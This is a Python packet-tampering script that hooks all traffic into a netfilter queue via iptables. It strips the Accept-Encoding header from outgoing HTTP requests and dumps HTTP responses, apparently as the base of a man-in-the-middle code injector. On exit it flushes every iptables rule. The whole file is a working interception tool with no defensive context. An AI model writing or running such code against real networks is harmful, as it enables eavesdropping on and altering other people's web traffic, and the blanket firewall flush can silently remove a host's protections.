#!usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re
import subprocess

subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        if scapyPacket[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            modifiedLoad = re.sub("Accept-Encoding:.*?\\r\\n", "", scapyPacket[scapy.Raw].load)
            newPacket = set_load(scapyPacket, modifiedLoad)
            packet.set_payload(str(newPacket))
        elif scapyPacket[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            print(scapyPacket.show())
    packet.accept()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n\n[-] Closing...")
    subprocess.call("iptables --flush", shell=True)